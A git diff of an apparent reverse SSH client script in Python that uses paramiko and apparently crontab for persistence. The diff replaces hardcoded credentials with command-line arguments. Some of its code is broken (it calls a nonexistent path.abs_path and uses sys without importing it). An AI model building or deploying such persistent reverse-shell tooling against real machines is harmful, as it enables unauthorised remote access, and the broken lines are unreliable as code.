@@ -1,19 +1,9 @@
 import paramiko
-from os import popen,system
+from os import popen,system, path
 from crontab import CronTab
 
-# host = input('Enter host: ')
-# port = int(input('Enter port: '))
-# username = input('Enter username: ')
-# password = input('Enter password: ')
-
-my_host = '192.168.1.197'
-my_port = 22
-my_username = 'aryehshebson'
-my_password = 'pass'
-
 client_name = 'reverse_ssh_client.py'
-client_path = '/home/aryeh/Desktop/reverse_ssh_client.py'
+client_path = path.abs_path(__file__)
 
 def already_running(process):
     return popen('pgrep -af python').read().count(process+'\n') > 1
@@ -40,6 +30,14 @@ def create_channel(host,username,password,port):
     return channel
 
 if __name__ == '__main__':
+    #parse argv
+    if len(sys.argv) != 4:
+        print('usage: python3 reverse_ssh_client.py [host] [username] [password]')
+        exit()
+    else:
+        host = sys.argv[1]
+        username = sys.argv[2]
+        password = sys.argv[3]
     #check process isn't already running
     if already_running(client_name):
         print('already running')
